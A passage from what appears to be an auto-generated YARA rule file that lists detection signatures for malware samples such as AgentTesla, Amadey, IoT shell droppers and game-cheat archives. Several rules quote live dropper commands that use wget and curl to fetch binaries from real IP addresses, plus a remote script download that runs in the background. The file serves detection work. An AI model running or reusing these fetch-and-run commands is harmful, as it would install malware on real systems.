      $s4 = "__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s5 = "baklala" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeca and filesize < 5000KB and
      all of them
}

rule sig_94f238048285ba3a908d8868dbd236849640ca846fe249dfea1a5c02d5b912dc_94f23804 {
   meta:
      description = "_subset_batch - file 94f238048285ba3a908d8868dbd236849640ca846fe249dfea1a5c02d5b912dc_94f23804.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "94f238048285ba3a908d8868dbd236849640ca846fe249dfea1a5c02d5b912dc"
   strings:
      $s1 = "ssw9183id118291.lNkUT" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5KB and
      all of them
}

rule sig_96f4babc0243cfa2a9fc79073b2b66fb99f19aca2fdc77c69bc1dec5bd4e3acf_96f4babc {
   meta:
      description = "_subset_batch - file 96f4babc0243cfa2a9fc79073b2b66fb99f19aca2fdc77c69bc1dec5bd4e3acf_96f4babc.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "96f4babc0243cfa2a9fc79073b2b66fb99f19aca2fdc77c69bc1dec5bd4e3acf"
   strings:
      $s1 = "ssiimg2.dll" fullword ascii /* score: '23.00'*/
      $s2 = "Gourmet.exe" fullword ascii /* score: '22.00'*/
      $s3 = "Grill.exe" fullword ascii /* score: '22.00'*/
      $s4 = "Update2.exe" fullword ascii /* score: '22.00'*/
      $s5 = "ssi030.dll" fullword ascii /* score: '20.00'*/
      $s6 = "ssi001.dll" fullword ascii /* score: '20.00'*/
      $s7 = "ssi002.dll" fullword ascii /* score: '20.00'*/
      $s8 = "qqqmmm" fullword ascii /* reversed goodware string 'mmmqqq' */ /* score: '15.00'*/
      $s9 = "Archives/reports/bg_header.jpg" fullword ascii /* score: '15.00'*/
      $s10 = "Gourmet.exe.manifest" fullword ascii /* score: '14.00'*/
      $s11 = "Archives/reports/header.html" fullword ascii /* score: '12.00'*/
      $s12 = "Archives/reports/movil.gif" fullword ascii /* score: '10.00'*/
      $s13 = "Archives/reports/bullet1.gif" fullword ascii /* score: '10.00'*/
      $s14 = "Archives/reports/bullet2.gif" fullword ascii /* score: '10.00'*/
      $s15 = "FuzpNq0.nLE%5Z" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dfb4dc82 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfb4dc82.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "dfb4dc821f2262bac5286080dd8276fe4306fa5cbe19fd795e3480510bd78415"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\SFLSkyvHnB\\src\\obj\\Debug\\jqVq.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADc" fullword ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s5 = "jqVq.exe" fullword wide /* score: '22.00'*/
      $s6 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s7 = "MySqlCommand" fullword ascii /* score: '12.00'*/
      $s8 = "MySql.Data.MySqlClient" fullword ascii /* score: '11.00'*/
      $s9 = "MySql.Data" fullword ascii /* score: '11.00'*/
      $s10 = "comando" fullword ascii /* score: '11.00'*/
      $s11 = "server=localhost;port=3307;uid=root;pwd=etecjau" fullword wide /* score: '11.00'*/
      $s12 = "openFileDialog1" fullword wide /* score: '10.00'*/
      $s13 = "E:\\materias\\DES_SIST\\WindowsForm\\ProjetoVendas\\211377\\fotos_clientes\\" fullword wide /* score: '10.00'*/
      $s14 = "get_estoque" fullword ascii /* score: '9.00'*/
      $s15 = "get_valor_venda" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule sig_9989354e288fa4f87d4818bb6fd003e55dba331189902bdcdd0497dec0caa36f_9989354e {
   meta:
      description = "_subset_batch - file 9989354e288fa4f87d4818bb6fd003e55dba331189902bdcdd0497dec0caa36f_9989354e.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9989354e288fa4f87d4818bb6fd003e55dba331189902bdcdd0497dec0caa36f"
   strings:
      $s1 = "codemark" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x8b55 and filesize < 7KB and
      all of them
}

rule AgentTesla_signature__ce42838b {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_ce42838b.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ce42838b6e07e77e81fa53922150cc3225de9d76b09c3a9bc611be1cf4b58579"
   strings:
      $s1 = "1PO PROCESSED CONFIRMATION.exe" fullword ascii /* score: '30.00'*/
      $s2 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s3 = "* y%fz!" fullword ascii /* score: '9.00'*/
      $s4 = "[.,`\\@54" fullword ascii /* score: '9.00'*/ /* hex encoded string 'T' */
   condition:
      uint16(0) == 0x6152 and filesize < 5000KB and
      all of them
}

rule sig_9b5c50a049988b37ed64f51eb97f5bf0570506a2a8d9a08ead25e75dfb118538_9b5c50a0 {
   meta:
      description = "_subset_batch - file 9b5c50a049988b37ed64f51eb97f5bf0570506a2a8d9a08ead25e75dfb118538_9b5c50a0.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9b5c50a049988b37ed64f51eb97f5bf0570506a2a8d9a08ead25e75dfb118538"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.arc; curl -O http://196.2" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.ppc; curl -O http://196.2" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.spc; curl -O http://196.2" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.arm; curl -O http://196.2" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.mpsl; curl -O http://196." ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.arm5; curl -O http://196." ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.arm6; curl -O http://196." ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.m68k; curl -O http://196." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.ppc; curl -O http://196.2" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.i686; curl -O http://196." ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.mips; curl -O http://196." ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.i468; curl -O http://196." ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.sh4; curl -O http://196.2" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.arc; curl -O http://196.2" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.162/00101010101001/morte.x86; curl -O http://196.2" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule a1b6f738b893cfcf704c482a256212020abb6cca997ac7133e3db545ea59000a_a1b6f738 {
   meta:
      description = "_subset_batch - file a1b6f738b893cfcf704c482a256212020abb6cca997ac7133e3db545ea59000a_a1b6f738.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a1b6f738b893cfcf704c482a256212020abb6cca997ac7133e3db545ea59000a"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.252.89.226/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule sig_9bc46c59e734b2389328a5103739f42bed7d820c73f75c49cc5a2e8cacfe8940_9bc46c59 {
   meta:
      description = "_subset_batch - file 9bc46c59e734b2389328a5103739f42bed7d820c73f75c49cc5a2e8cacfe8940_9bc46c59.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9bc46c59e734b2389328a5103739f42bed7d820c73f75c49cc5a2e8cacfe8940"
   strings:
      $x1 = "wget -q -O \"$HOME/downlin.sh\" https://raw.githubusercontent.com/RominaMabelRamirez/dify/refs/heads/bai/api/downlin.sh" fullword ascii /* score: '38.00'*/
      $s2 = "if [ -x /usr/bin/python3 ]; then" fullword ascii /* score: '15.00'*/
      $s3 = "/usr/bin/python3 -m pip install requests pyperclip > /dev/null 2>&1" fullword ascii /* score: '15.00'*/
      $s4 = "\"$HOME/downlin.sh\" > /dev/null 2>&1 &" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e51cdd46 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e51cdd46.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e51cdd46aa8f65e8dc2eefbbd5c0d5285397a118139356424ed651dc1c06c06c"
   strings:
      $s1 = "Jafwokyyo.exe" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "<InvokeTargetMethod>b__0" fullword ascii /* score: '18.00'*/
      $s4 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "https://app.nihaocloud.com/f/a0a35906cae847869b49/?dl=1" fullword wide /* score: '13.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__38a52d0e {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_38a52d0e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "38a52d0e3a510b0b5ba6517336ad441d90511cfb13fe8906075edc0b0ff6fdff"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "DownloaderApp.nVspv1Ub.str" fullword ascii /* score: '25.00'*/
      $s3 = "DownloaderApp.ZuVIc2du.res" fullword ascii /* score: '25.00'*/
      $s4 = "* [9^:" fullword ascii /* score: '9.00'*/
      $s5 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s6 = "oYWI* ,B" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4917f5b2 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4917f5b2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4917f5b276116d77d728e1680b99ade7ff06b71a34170948465e972a4a3f4900"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "DownloaderApp.ht7xsfv3.str" fullword ascii /* score: '22.00'*/
      $s3 = "DownloaderApp.4cAmZPJU.res" fullword ascii /* score: '18.00'*/
      $s4 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__564f4856 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_564f4856.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "564f48565805ff2a2e8070d73015a6197badf12b9ca7e1c98b5b4161e7276580"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "DownloaderApp.cgWAkByf.res" fullword ascii /* score: '25.00'*/
      $s3 = "DownloaderApp.3u3EQUKN.str" fullword ascii /* score: '22.00'*/
      $s4 = "uKkt.WTs" fullword ascii /* score: '10.00'*/
      $s5 = "sScQ:\"" fullword ascii /* score: '10.00'*/
      $s6 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s7 = "* 1gdr" fullword ascii /* score: '9.00'*/
      $s8 = "+ -By<" fullword ascii /* score: '9.00'*/
      $s9 = "eEye7\\" fullword ascii /* score: '9.00'*/
      $s10 = "aoNX* N" fullword ascii /* score: '8.00'*/
      $s11 = "CIex nB" fullword ascii /* score: '8.00'*/
      $s12 = "cffkste" fullword ascii /* score: '8.00'*/
      $s13 = " -lHrDgd0!:" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5d7632fb {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5d7632fb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5d7632fb517241af70824aa3558daafc5ce6842713d952dcf1b1703183f62944"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "DownloaderApp.L2VXAnQn.str" fullword ascii /* score: '22.00'*/
      $s3 = "DownloaderApp.6Y0Sa0IJ.res" fullword ascii /* score: '22.00'*/
      $s4 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s5 = "* _UXOT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__713c719a {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_713c719a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "713c719a6d6041d4dca72f777499fc17819dd6b39912d8a1f430cd1c6866ca5e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "DownloaderApp.38iP1FM6.res" fullword ascii /* score: '22.00'*/
      $s3 = "DownloaderApp.7Y3Mk8vB.str" fullword ascii /* score: '22.00'*/
      $s4 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
      $s5 = "<2\\{>{2!" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
      $s6 = "gKFtp$~" fullword ascii /* score: '9.00'*/
      $s7 = "\\7t$S:\\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c69f4553 {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c69f4553.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c69f4553d904aa729695c2e8bf7deb60c40ed4c45366f81d1d1e4bdc432054da"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "DownloaderApp.NilfrRXw.str" fullword ascii /* score: '25.00'*/
      $s3 = "DownloaderApp.Asg1GWV2.res" fullword ascii /* score: '25.00'*/
      $s4 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bde95bf8 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bde95bf8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "bde95bf84e2dd49468976cc4aacb13769539f3a414cde2ebece71743cd70bdeb"
   strings:
      $s1 = "Rjaxsckdob.exe" fullword wide /* score: '22.00'*/
      $s2 = "EncryptorDefinition" fullword ascii /* score: '14.00'*/
      $s3 = "EncodeRandomEncryptor" fullword ascii /* score: '14.00'*/
      $s4 = "LogPassiveWriter" fullword ascii /* score: '12.00'*/
      $s5 = "Rjaxsckdob.Conversion" fullword ascii /* score: '10.00'*/
      $s6 = "get_Srbpcgmpo" fullword ascii /* score: '9.00'*/
      $s7 = "^%I%SQ" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dc49aeec {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dc49aeec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "dc49aeec5bb4764842104e24b3904378d4ce5c8a1a9f73df7d318dd40a2df303"
   strings:
      $s1 = "Runsrul.exe" fullword wide /* score: '25.00'*/
      $s2 = "Runsrul.API.Requester" fullword ascii /* score: '13.00'*/
      $s3 = "Runsrul.Messaging" fullword ascii /* score: '10.00'*/
      $s4 = "Nqvbcreypls.Conversion" fullword ascii /* score: '10.00'*/
      $s5 = "Runsrul" fullword wide /* score: '9.00'*/
      $s6 = "get_Enyciaeigh" fullword ascii /* score: '9.00'*/
      $s7 = "mbgkgzq" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule sig_9cb26a90925c6dc9cee98be384fc2fb478eaf52d32f4e036c56b5cbf1fe4fbd3_9cb26a90 {
   meta:
      description = "_subset_batch - file 9cb26a90925c6dc9cee98be384fc2fb478eaf52d32f4e036c56b5cbf1fe4fbd3_9cb26a90.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9cb26a90925c6dc9cee98be384fc2fb478eaf52d32f4e036c56b5cbf1fe4fbd3"
   strings:
      $s1 = "vcruntime140.dll" fullword ascii /* score: '26.00'*/
      $s2 = "keytool.exe" fullword ascii /* score: '25.00'*/
      $s3 = "CreateHiddenTask.vbs" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule sig_9d8c005920188c5d3cf036243d54e15c693ae2dcc63fd51112a69d293b57ad75_9d8c0059 {
   meta:
      description = "_subset_batch - file 9d8c005920188c5d3cf036243d54e15c693ae2dcc63fd51112a69d293b57ad75_9d8c0059.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9d8c005920188c5d3cf036243d54e15c693ae2dcc63fd51112a69d293b57ad75"
   strings:
      $s1 = "Password - ryos" fullword ascii /* score: '20.00'*/
      $s2 = "Launch .exe" fullword ascii /* score: '19.00'*/
      $s3 = "Open Roblox, and inject" fullword ascii /* score: '14.00'*/
      $s4 = "q+ -c'" fullword ascii /* score: '9.00'*/
      $s5 = "nbQt- A" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 13000KB and
      all of them
}

rule sig_9e800e2813d74c369d02c010904d27d077ff69ee6392cae2c785c92ad68b503d_9e800e28 {
   meta:
      description = "_subset_batch - file 9e800e2813d74c369d02c010904d27d077ff69ee6392cae2c785c92ad68b503d_9e800e28.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9e800e2813d74c369d02c010904d27d077ff69ee6392cae2c785c92ad68b503d"
   strings:
      $s1 = "CM-Ultimate-main/BattlepassHUABYJoelmatic.dllUT" fullword ascii /* score: '16.00'*/
      $s2 = "CM-Ultimate-main/CM_BP.dllUT" fullword ascii /* score: '13.00'*/
      $s3 = "CM-Ultimate-main/WWL_BP.dllUT" fullword ascii /* score: '13.00'*/
      $s4 = "CM-Ultimate-main/ESP.dllUT" fullword ascii /* score: '13.00'*/
      $s5 = "CM-Ultimate-main/guide.txtUT" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule sig_9f088c94b3cb723dd6826940570121538af20da5c3291b6af46fc5d0f401b0f2_9f088c94 {
   meta:
      description = "_subset_batch - file 9f088c94b3cb723dd6826940570121538af20da5c3291b6af46fc5d0f401b0f2_9f088c94.jar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9f088c94b3cb723dd6826940570121538af20da5c3291b6af46fc5d0f401b0f2"
   strings:
      $s1 = "assets/template/icon.png" fullword ascii /* score: '14.00'*/
      $s2 = "com/nnpg/glazed/modules/AutoShulkerShellOrder$Stage.classPK" fullword ascii /* score: '13.00'*/
      $s3 = "com/nnpg/glazed/modules/AutoShulkerShellOrder$Stage.class" fullword ascii /* score: '13.00'*/
      $s4 = "com/nnpg/glazed/modules/AutoShulkerShellOrder.classPK" fullword ascii /* score: '13.00'*/
      $s5 = "com/nnpg/glazed/modules/AutoShulkerShellOrder.class" fullword ascii /* score: '13.00'*/
      $s6 = "assets/template/" fullword ascii /* score: '11.00'*/
      $s7 = "assets/template/icon.pngPK" fullword ascii /* score: '11.00'*/
      $s8 = "assets/template/PK" fullword ascii /* score: '11.00'*/
      $s9 = "fabric.mod.json" fullword ascii /* score: '10.00'*/
      $s10 = "fabric.mod.jsonPK" fullword ascii /* score: '10.00'*/
      $s11 = "%E%RDLL" fullword ascii /* score: '10.00'*/
      $s12 = "com/nnpg/glazed/utils/glazed/EncryptedString.class" fullword ascii /* score: '8.00'*/
      $s13 = "com/nnpg/glazed/modules/esp/ChunkFinder$ChunkScanResult.classPK" fullword ascii /* score: '8.00'*/
      $s14 = "com/nnpg/glazed/modules/UndetectedTunneler$PathScanner.classPK" fullword ascii /* score: '8.00'*/
      $s15 = "com/nnpg/glazed/modules/esp/ChunkFinder$ChunkScanResult.class" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      8 of them
}

rule a0673f0072937b6949dca7347a1e543f3f29f697c1d2c6cbe3ab974f025800bd_a0673f00 {
   meta:
      description = "_subset_batch - file a0673f0072937b6949dca7347a1e543f3f29f697c1d2c6cbe3ab974f025800bd_a0673f00.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a0673f0072937b6949dca7347a1e543f3f29f697c1d2c6cbe3ab974f025800bd"
   strings:
      $s1 = "temp.ahk" fullword ascii /* score: '17.00'*/
      $s2 = "temp (2).ahk" fullword ascii /* score: '14.00'*/
      $s3 = "temp (3).ahk" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10KB and
      all of them
}

rule a198df4d2e635d0e5126c21d6f16b9d4f553421c7ae5a0176968811cf97d426b_a198df4d {
   meta:
      description = "_subset_batch - file a198df4d2e635d0e5126c21d6f16b9d4f553421c7ae5a0176968811cf97d426b_a198df4d.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a198df4d2e635d0e5126c21d6f16b9d4f553421c7ae5a0176968811cf97d426b"
   strings:
      $s1 = "package/KMFtpSN.dll" fullword ascii /* score: '25.00'*/
      $s2 = "package/KMFtpVR.dll" fullword ascii /* score: '25.00'*/
      $s3 = "package/KMFTPReg.dll" fullword ascii /* score: '25.00'*/
      $s4 = "package/KMFtpEV.dll" fullword ascii /* score: '25.00'*/
      $s5 = "package/KMFtpCM.dll" fullword ascii /* score: '25.00'*/
      $s6 = "tMxKN1M+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule a3__Logger_signature_ {
   meta:
      description = "_subset_batch - file a3--Logger(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "75e39cba6e63aa2bace210d677dce50804b52402b0b9fbfc16cc9a748a9c96bb"
   strings:
      $s1 = "* xd8JkJ" fullword ascii /* score: '9.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s3 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
      $s4 = "93.SAM" fullword ascii /* score: '8.00'*/
      $s5 = "tdxqsbhu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule AgentTesla_signature__4 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "43c36d7bc237bc548c2ab3f911ef2db7120932b054b96fa4f57bb831e424709b"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__1a1d386c {
   meta:
